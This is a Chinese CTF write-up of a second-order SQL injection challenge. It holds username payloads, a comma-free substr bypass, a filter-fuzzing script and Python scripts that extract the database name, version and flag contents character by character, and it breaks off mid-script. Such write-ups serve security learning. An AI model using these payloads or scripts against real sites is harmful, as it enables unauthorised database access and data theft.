title="测试payload:"></a>测试payload:</h3><p><strong>由于username为二次注入的再次回显点，所以要利用username进行注入</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=123@qq.com<br>&amp;username=1&#x27; and &#x27;0<br>&amp;password=123<br></code></pre></td></tr></table></figure><h3 id="构造出来的sql语句"><a href="#构造出来的sql语句" class="headerlink" title="构造出来的sql语句:"></a>构造出来的sql语句:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into user values(&#x27;123@qq.com&#x27;,&#x27;1&#x27; and &#x27;0&#x27;,&#x27;123&#x27;)<br>&lt;=&gt;<br>insert into user values(&#x27;123@qq.com&#x27;,0,&#x27;123&#x27;)<br></code></pre></td></tr></table></figure><h3 id="使用本地数据库测试我们的payload"><a href="#使用本地数据库测试我们的payload" class="headerlink" title="使用本地数据库测试我们的payload:"></a>使用本地数据库测试我们的payload:</h3><p><img src="/images/2024-2-18/image-20240215144025756.png" alt="image-20240215144025756"></p><h3 id="重新注册我们的信息，插入我们的payload"><a href="#重新注册我们的信息，插入我们的payload" class="headerlink" title="重新注册我们的信息，插入我们的payload:"></a>重新注册我们的信息，插入我们的payload:</h3><p>由于该网页经过测试，不是在原来的用户上进行信息更新，每次注册都是产生一个新用户，如果用重复的邮箱注册，回显的还是一开始注册邮箱的用户名信息。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=1234@qq.com<br>&amp;username=1&#x27; and &#x27;0<br>&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215144444133.png" alt="image-20240215144444133"></p><h4 id="index-php显示结果"><a href="#index-php显示结果" class="headerlink" title="index.php显示结果:"></a>index.php显示结果:</h4><p><img src="/images/2024-2-18/image-20240215144501494.png" alt="image-20240215144501494"></p><p>用户名显示的信息为0，所以该网页存在二次注入。</p><h2 id="构造二次注入的payload"><a href="#构造二次注入的payload" class="headerlink" title="构造二次注入的payload:"></a>构造二次注入的payload:</h2><h3 id="从insert语句中分析"><a href="#从insert语句中分析" class="headerlink" title="从insert语句中分析:"></a>从insert语句中分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into user values(&#x27;xxx&#x27;,&#x27;yyy&#x27;,&#x27;123&#x27;)<br>=&gt;<br>xxx=12345@qq.com&#x27;,database(),&#x27;123&#x27;);/*<br>=&gt;<br>insert into user values(&#x27;12345@qq.com&#x27;,database(),&#x27;123&#x27;);/*&#x27;,&#x27;yyy&#x27;,&#x27;123&#x27;)<br></code></pre></td></tr></table></figure><h4 id="本地测试sql语句"><a href="#本地测试sql语句" class="headerlink" title="本地测试sql语句:"></a>本地测试sql语句:</h4><p><img src="/images/2024-2-18/image-20240215145954465.png" alt="image-20240215145954465"></p><h3 id="上传我们的payload"><a href="#上传我们的payload" class="headerlink" title="上传我们的payload:"></a>上传我们的payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=2@qq.com&#x27;,database(),&#x27;123&#x27;);/*&amp;username=south&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215150524978.png" alt="image-20240215150524978"></p><p><img src="/images/2024-2-18/image-20240215150601141.png" alt="image-20240215150601141"></p><p>注册了，但是没法登录，emmmm,尝试了很多次也没用，这里应该是自己的方式错了，所以参考大佬的wp在显示点username上直接注入。</p><h2 id="二次注入在显示点上直接写入注入payload"><a href="#二次注入在显示点上直接写入注入payload" class="headerlink" title="二次注入在显示点上直接写入注入payload:"></a>二次注入在显示点上直接写入注入payload:</h2><h3 id="第一种方式：使用脚本爆破"><a href="#第一种方式：使用脚本爆破" class="headerlink" title="第一种方式：使用脚本爆破:"></a>第一种方式：使用脚本爆破:</h3><p><strong>这里需要用到’+’,该符号在mysql中为运算符，不作为字符串的拼接，使用该符号是为了用于闭合左右单引号</strong></p><h3 id="本地测试使用"><a href="#本地测试使用" class="headerlink" title="本地测试使用:"></a>本地测试使用:</h3><h4 id="sql1"><a href="#sql1" class="headerlink" title="sql1:"></a>sql1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select &#x27;1&#x27;+&#x27;2&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215151846840.png" alt="image-20240215151846840"></p><h4 id="sql2"><a href="#sql2" class="headerlink" title="sql2:"></a>sql2:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select &#x27;0&#x27;+ascii(substr(database(),1,1));<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215152023562.png" alt="image-20240215152023562"></p><p>这里直接回显出了数据库第一个字符的ascii码值。</p><h4 id="sql3"><a href="#sql3" class="headerlink" title="sql3:"></a>sql3:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select &#x27;0&#x27;+ascii(substr(database(),1,1))+&#x27;0&#x27;;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215152207479.png" alt="image-20240215152207479"></p><h4 id="sql4"><a href="#sql4" class="headerlink" title="sql4:"></a>sql4:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">INSERT into beanpublisher VALUES (&#x27;5&#x27;,&#x27;0&#x27;+ascii(substr(database(),1,1))+&#x27;0&#x27;,&#x27;123&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215152400749.png" alt="image-20240215152400749"></p><h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造:"></a>payload构造:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=1235@qq.com<br>&amp;username=0&#x27;+ascii(substr(database(),1,1))+&#x27;0<br>&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215152531014.png" alt="image-20240215152531014"></p><p>发现我们输入的内容进行过滤了，所以先要寻找它过滤的内容。</p><h3 id="fuzz-py"><a href="#fuzz-py" class="headerlink" title="fuzz.py:"></a>fuzz.py:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list = []<br>white_list = []<br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     # da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1/**/&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # 使用time使请求能够拥有足够的时间去响应</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # 获取过滤网站响应信息</span><br><span class="hljs-comment">#     reponse_txt = &quot;你还想执行&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(data)</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    <span class="hljs-comment"># POST传输json数据</span><br>    payload = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&#x27;1235@qq.com&#x27;</span>,<br>        <span class="hljs-string">&quot;username&quot;</span>: da,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&#x27;123&#x27;</span><br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;nnnnoooo!!!&quot;</span><br>    <span class="hljs-comment"># print(r.text)</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br>    <span class="hljs-keyword">else</span>:<br>        white_list.append(d)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;黑名单数据:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(black_list))<br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;白名单数据:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(white_list))<br></code></pre></td></tr></table></figure><h4 id="输出"><a href="#输出" class="headerlink" title="输出:"></a>输出:</h4><p><img src="/images/2024-2-18/image-20240215153203778.png" alt="image-20240215153203778"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">黑名单数据:[&#x27;INFORMATION&#x27;, &#x27;information_schema.tables&#x27;, &#x27;,&#x27;]<br></code></pre></td></tr></table></figure><p>通过黑名单数据我们知道我们不能使用’,’,所以要重新构造ascii(substr(database(),1,1))</p><h3 id="重新构造payload"><a href="#重新构造payload" class="headerlink" title="重新构造payload:"></a>重新构造payload:</h3><p><strong>可以利用mysql的substr()函数的from x for len获取字符串中的字符</strong></p><h4 id="sql1-1"><a href="#sql1-1" class="headerlink" title="sql1:"></a>sql1:</h4><p>获取第一个字符</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select substr(&#x27;abcdef&#x27; from 1 for 1)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215153802945.png" alt="image-20240215153802945"></p><h4 id="sql2-1"><a href="#sql2-1" class="headerlink" title="sql2:"></a>sql2:</h4><p>获取第二个字符</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select substr(&#x27;abcdef&#x27; from 2 for 1)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215153833878.png" alt="image-20240215153833878"></p><h4 id="sql3-1"><a href="#sql3-1" class="headerlink" title="sql3:"></a>sql3:</h4><p>获取从第二个字符开始的三个字符</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select substr(&#x27;abcdef&#x27; from 2 for 3)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215153930664.png" alt="image-20240215153930664"></p><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=666%40qq.com&amp;username=0&#x27;+ascii(substr(database()/**/from/**/1/**/for/**/1))+&#x27;0&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215154856317.png" alt="image-20240215154856317"></p><p><img src="/images/2024-2-18/image-20240215154919699.png" alt="image-20240215154919699"></p><p>成功获取到数据库第一个字符的ascii码为119&#x3D;&gt;字符’w’</p><h3 id="根据payload构造爆破脚本"><a href="#根据payload构造爆破脚本" class="headerlink" title="根据payload构造爆破脚本:"></a>根据payload构造爆破脚本:</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">使用脚本在register.php页面上传我们的payload,然后根据二次注入对的原理，在index.php界面获取用户名的值，最终将数据拼接成完整的信息。<br></code></pre></td></tr></table></figure><h4 id="爆数据库脚本"><a href="#爆数据库脚本" class="headerlink" title="爆数据库脚本:"></a>爆数据库脚本:</h4><h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本:"></a>脚本:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># register.php界面</span><br>url1 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># login.php界面</span><br>url2 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># index.php界面</span><br>url3 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/index.php&quot;</span><br><br><span class="hljs-comment"># 设置数据库名的长度</span><br>database_len = <span class="hljs-number">30</span><br><br>database = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_len):<br>    <span class="hljs-comment"># 注册</span><br>    paylaod = <span class="hljs-string">&quot;0&#x27;+ascii(substr(database()/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data1 = &#123;<br>        <span class="hljs-comment"># 设置不同的email</span><br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s1&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;username&quot;</span>: paylaod,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>        <br>    &#125;<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-comment"># 上传注册信息</span><br>    r1 = requests.post(url=url1, data=data1)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># 登录</span><br>    data2 = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s1&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-comment"># 由于login.php登录后location为index.php,所以直接重定向到index.php界面</span><br>    <span class="hljs-comment"># 回显的内容也为index.php界面的</span><br>    r2 = requests.post(url=url2, data=data2)<br>    <span class="hljs-comment"># print(r2.text)</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># 访问index.php</span><br>    <span class="hljs-comment"># r3 = requests.post(url=url3, data=data2)</span><br>    <span class="hljs-comment"># time.sleep(0.03)</span><br>    <span class="hljs-comment"># print(r3.text)</span><br>    <span class="hljs-comment"># 获取username显示的值</span><br>    soup = BeautifulSoup(r2.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    span_elements = soup.find_all(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>    <span class="hljs-comment"># print(span_elements)</span><br>    uername_span_value = span_elements[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(uername_span_value)</span><br>    <span class="hljs-comment"># 回显元素里面的内容</span><br>    <span class="hljs-comment"># print(uername_span_value.text)</span><br>    <br>    <span class="hljs-comment"># 使用正则提取里面的数值</span><br>    <span class="hljs-comment"># pattern = r&#x27;&lt;span\s+class=&quot;user-name&quot;&gt;\s*(\d+)\s*&lt;/span&gt;&#x27;</span><br>    <span class="hljs-comment"># match = re.search(pattern, r2.text)</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, uername_span_value.text)<br>    <span class="hljs-comment"># 获取匹配的内容</span><br>    <span class="hljs-keyword">match</span> = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>    database = database + <span class="hljs-built_in">chr</span>(<span class="hljs-keyword">match</span>)<br>    <br><span class="hljs-built_in">print</span>(database)<br></code></pre></td></tr></table></figure><h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出:"></a>输出:</h5><p><img src="/images/2024-2-18/image-20240215171342866.png" alt="image-20240215171342866"></p><p>数据库名为web</p><h3 id="爆数据库版本信息"><a href="#爆数据库版本信息" class="headerlink" title="爆数据库版本信息:"></a>爆数据库版本信息:</h3><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">paylaod = &quot;0&#x27;+ascii(substr((select/**/VERSION())/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;.format(i)<br></code></pre></td></tr></table></figure><h5 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本:"></a>脚本:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># register.php界面</span><br>url1 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># login.php界面</span><br>url2 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># index.php界面</span><br>url3 = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/index.php&quot;</span><br><br><span class="hljs-comment"># 设置数据库名的长度</span><br>version_len = <span class="hljs-number">30</span><br><br>version = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, version_len):<br>    <span class="hljs-comment"># 注册</span><br>    paylaod = <span class="hljs-string">&quot;0&#x27;+ascii(substr((select/**/VERSION())/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data1 = &#123;<br>        <span class="hljs-comment"># 设置不同的email</span><br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s2&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;username&quot;</span>: paylaod,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>        <br>    &#125;<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-comment"># 上传注册信息</span><br>    r1 = requests.post(url=url1, data=data1)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># 登录</span><br>    data2 = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s2&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-comment"># 由于login.php登录后location为index.php,所以直接重定向到index.php界面</span><br>    <span class="hljs-comment"># 回显的内容也为index.php界面的</span><br>    r2 = requests.post(url=url2, data=data2)<br>    <span class="hljs-comment"># print(r2.text)</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># 访问index.php</span><br>    <span class="hljs-comment"># r3 = requests.post(url=url3, data=data2)</span><br>    <span class="hljs-comment"># time.sleep(0.03)</span><br>    <span class="hljs-comment"># print(r3.text)</span><br>    <span class="hljs-comment"># 获取username显示的值</span><br>    soup = BeautifulSoup(r2.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    span_elements = soup.find_all(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>    <span class="hljs-comment"># print(span_elements)</span><br>    uername_span_value = span_elements[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(uername_span_value)</span><br>    <span class="hljs-comment"># 回显元素里面的内容</span><br>    <span class="hljs-comment"># print(uername_span_value.text)</span><br>    <br>    <span class="hljs-comment"># 使用正则提取里面的数值</span><br>    <span class="hljs-comment"># pattern = r&#x27;&lt;span\s+class=&quot;user-name&quot;&gt;\s*(\d+)\s*&lt;/span&gt;&#x27;</span><br>    <span class="hljs-comment"># match = re.search(pattern, r2.text)</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, uername_span_value.text)<br>    <span class="hljs-comment"># 获取匹配的内容</span><br>    <span class="hljs-keyword">match</span> = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>    version = version + <span class="hljs-built_in">chr</span>(<span class="hljs-keyword">match</span>)<br>    <br><span class="hljs-built_in">print</span>(version)<br></code></pre></td></tr></table></figure><h5 id="输出-2"><a href="#输出-2" class="headerlink" title="输出:"></a>输出:</h5><p><img src="/images/2024-2-18/image-20240215172813980.png" alt="image-20240215172813980"></p><p>数据库版本为5.5.64，不能使用5.7以上的sys.schema_table_statistics_with_buffer来获取表名，以及5.6以上的mysql.innodb_table_stats,查了很多资料5.5版本好像没有其他方式获取表信息，看了其他师傅的wp好像flag都是猜出来的，那也只能猜flag就在flag表中，且为flag表的唯一记录，唯一字段。</p><h3 id="爆flag表的唯一记录唯一字段值"><a href="#爆flag表的唯一记录唯一字段值" class="headerlink" title="爆flag表的唯一记录唯一字段值:"></a>爆flag表的唯一记录唯一字段值:</h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">paylaod = &quot;0&#x27;+ascii(substr((select/**/*/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;.format(i)<br></code></pre></td></tr></table></figure><h4 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本:"></a>脚本:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 